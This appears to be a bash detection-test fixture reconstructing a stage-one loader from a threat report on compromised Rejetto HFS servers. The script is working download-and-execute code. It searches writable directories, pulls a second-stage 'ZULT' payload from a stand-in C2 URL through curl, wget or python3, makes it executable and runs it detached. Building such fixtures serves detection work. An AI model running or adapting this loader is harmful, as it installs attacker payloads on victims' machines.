#!/bin/bash
# Synthesized detection-test fixture, reconstructed from GreyNoise's GT13 report.
# This is a shell one-liner issued through the compromised Rejetto HFS server's
# server_code feature: it probes several writable directories, fetches a
# second-stage Linux payload ("ZULT") from an attacker-controlled C2 domain
# using whichever downloader is available (curl, wget, or python3), marks it
# executable, and launches it with a registration token as an env var.
U='https://data-zt.newpayapp.example/agent/linux?passcode=000000&reg_token=deadbeef00'
T='deadbeef00'
ok=''
command -v setsid >/dev/null && SS=setsid || SS=
for D in "$HOME" /dev/shm /var/tmp /tmp; do
  [ -w "$D" ] || continue
  F="$D/.s"
  rm -f "$F.dl"
  (command -v curl >/dev/null && curl -fsSL --http1.1 "$U" -o "$F.dl") 2>/dev/null \
    || (command -v wget >/dev/null && wget -q "$U" -O "$F.dl") 2>/dev/null \
    || (command -v python3 >/dev/null && python3 -c "import urllib.request,sys;open(sys.argv[2],'wb').write(urllib.request.urlopen(sys.argv[1],timeout=60).read())" "$U" "$F.dl") 2>/dev/null
  [ -s "$F.dl" ] && [ "$(wc -c <"$F.dl")" -ge 1000000 ] || { rm -f "$F.dl"; continue; }
  chmod +x "$F.dl"
  mv -f "$F.dl" "$F"
  ZULT_REG="$T" $SS "$F" >/dev/null 2>&1 && { ok="$F"; break; }
  rm -f "$F"
done
[ -n "$ok" ] && echo "ZULT_OK:$ok" || echo "ZULT_FAIL:no-exec-dir-or-download"
